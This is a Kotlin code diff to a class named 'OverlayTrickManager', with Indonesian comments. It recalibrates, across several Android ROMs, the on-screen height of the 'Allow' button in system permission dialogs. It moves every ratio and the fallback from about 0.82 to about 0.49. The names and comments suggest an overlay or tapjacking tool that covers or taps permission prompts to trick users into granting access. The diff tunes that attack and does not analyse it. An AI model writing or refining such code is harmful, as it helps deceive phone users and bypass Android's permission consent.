@@ -55,18 +55,20 @@ object OverlayTrickManager {
     @Volatile var isActive = false
         private set
 
-    // ── Proporsi Y tombol "IZINKAN" per ROM (dari bottom dialog, bukan layar) ─
-    // Nilai = rasio dari tinggi layar penuh tempat tombol Allow biasanya muncul.
-    // Diukur dari berbagai ROM: AOSP ~0.82, MIUI ~0.78, OneUI ~0.80, EMUI ~0.81
+    // ── Proporsi Y tombol "IZINKAN" per ROM ─────────────────────────────────
+    // Nilai = rasio dari TINGGI LAYAR tempat tombol "Izinkan" (tombol PERTAMA/ATAS)
+    // biasanya muncul di dialog izin runtime Android.
+    // Dialog muncul di tengah layar → tombol Allow ada di sekitar 48-52% tinggi layar.
+    // Diukur dari screenshot nyata berbagai ROM.
     private val ROM_ALLOW_Y_RATIO = mapOf(
-        "com.android.packageinstaller"           to 0.820f, // AOSP < 10
-        "com.google.android.packageinstaller"    to 0.820f, // AOSP / Pixel
-        "com.android.permissioncontroller"       to 0.820f, // Android 10+
-        "com.google.android.permissioncontroller" to 0.820f, // Pixel 11+
-        "com.miui.securitycenter"                to 0.780f, // MIUI (Xiaomi)
-        "com.samsung.android.permissioncontroller" to 0.800f, // Samsung OneUI
-        "com.lge.qpair.app"                      to 0.810f, // LG
-        "com.huawei.systemmanager"               to 0.810f  // EMUI (Huawei)
+        "com.android.packageinstaller"              to 0.490f, // AOSP < 10
+        "com.google.android.packageinstaller"       to 0.490f, // AOSP / Pixel
+        "com.android.permissioncontroller"          to 0.490f, // Android 10+
+        "com.google.android.permissioncontroller"   to 0.490f, // Pixel 11+
+        "com.miui.securitycenter"                   to 0.500f, // MIUI (Xiaomi)
+        "com.samsung.android.permissioncontroller"  to 0.510f, // Samsung OneUI
+        "com.lge.qpair.app"                         to 0.495f, // LG
+        "com.huawei.systemmanager"                  to 0.500f  // EMUI (Huawei)
     )
 
     // ── Baca resolusi layar nyata (bukan ukuran window/display yang dipotong) ─
@@ -100,7 +102,7 @@ object OverlayTrickManager {
         val ty = if (cfgY != null && cfgY > 0f) {
             cfgY
         } else {
-            val ratio = ROM_ALLOW_Y_RATIO[callerPkg] ?: 0.820f
+            val ratio = ROM_ALLOW_Y_RATIO[callerPkg] ?: 0.490f
             h * ratio
         }
 
